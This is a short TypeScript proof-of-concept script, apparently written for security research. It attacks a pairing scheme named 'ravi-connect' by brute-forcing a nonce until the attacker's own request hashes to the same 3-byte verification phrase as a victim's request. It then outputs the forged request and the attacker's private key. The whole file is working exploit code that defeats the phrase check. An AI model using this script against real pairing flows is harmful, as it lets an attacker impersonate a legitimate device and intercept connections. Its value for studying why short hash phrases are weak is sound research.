// Grind a second request (attacker's own key, same origin/preset/installs) whose phrase equals a victim's phrase.
// Usage: bun a2-grind.ts <victim-request-text>  -> prints the forged request text and stats on stderr.
import { createHash, webcrypto, randomBytes } from "node:crypto";
const victim = process.argv[2];
const raw = Buffer.from(victim.slice("ravi-connect:v1:".length), "base64url").toString();
const v = JSON.parse(raw);
const target = createHash("sha256").update(raw).digest().subarray(0, 3);
const k = await webcrypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
const j: any = await webcrypto.subtle.exportKey("jwk", k.publicKey);
const iat = Date.now();
const head = JSON.stringify({ v: 1, kind: "ravi-connect", origin: v.origin, pub: { x: j.x, y: j.y }, preset: v.preset, installs: v.installs, nonce: "" }).slice(0, -3); // ..."nonce":
const tail = `,"iat":${iat}}`;
const t0 = performance.now();
let n = 0;
const base = randomBytes(10).toString("base64url").slice(0, 12); // 12 chars + 10 counter chars = 22
for (;;) {
  const nonce = base + n.toString(36).padStart(10, "0");
  const s = `${head}"${nonce}"${tail}`;
  const h = createHash("sha256").update(s).digest();
  n++;
  if (h[0] === target[0] && h[1] === target[1] && h[2] === target[2]) {
    const ms = performance.now() - t0;
    const pk = await webcrypto.subtle.exportKey("pkcs8", k.privateKey);
    console.error(JSON.stringify({ hashes: n, seconds: +(ms / 1000).toFixed(1), rate_per_s: Math.round(n / (ms / 1000)) }));
    console.log(JSON.stringify({ text: "ravi-connect:v1:" + Buffer.from(s).toString("base64url"), pkcs8: Buffer.from(pk).toString("base64url") }));
    break;
  }
}
